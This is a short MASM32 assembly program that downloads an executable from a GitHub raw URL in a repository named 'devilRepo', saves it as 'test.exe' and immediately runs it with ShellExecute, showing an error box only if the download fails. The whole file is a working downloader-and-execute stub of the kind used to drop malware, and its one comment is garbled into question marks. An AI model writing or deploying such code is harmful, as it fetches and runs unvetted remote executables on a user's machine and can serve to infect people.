.386
.model flat, stdcall
option casemap:none

include windows.inc
include kernel32.inc
include user32.inc
include shell32.inc

includelib kernel32.lib
includelib user32.lib
includelib shell32.lib
includelib urlmon.lib

; ? ????????? ??????? MASM32 urlmon.inc ??????????? — ????????? ???????? ???????
URLDownloadToFileA PROTO :DWORD, :DWORD, :DWORD, :DWORD, :DWORD

.data
    szURL    db "https://github.com/AlexGoProger/devilRepo/raw/refs/heads/main/main.exe", 0
    szFile   db "test.exe", 0
    szOpen   db "open", 0
    szTitle  db "Test", 0
    szFail   db "Download FAILED", 0

.code
start:
    
    invoke URLDownloadToFileA, NULL, addr szURL, addr szFile, 0, NULL
    test eax, eax
    jnz  @fail

    invoke ShellExecute, NULL, addr szOpen, addr szFile, NULL, NULL, SW_SHOW
    jmp  @exit

@fail:
    invoke MessageBox, NULL, addr szFail, addr szTitle, MB_ICONERROR

@exit:
    invoke ExitProcess, 0

end start
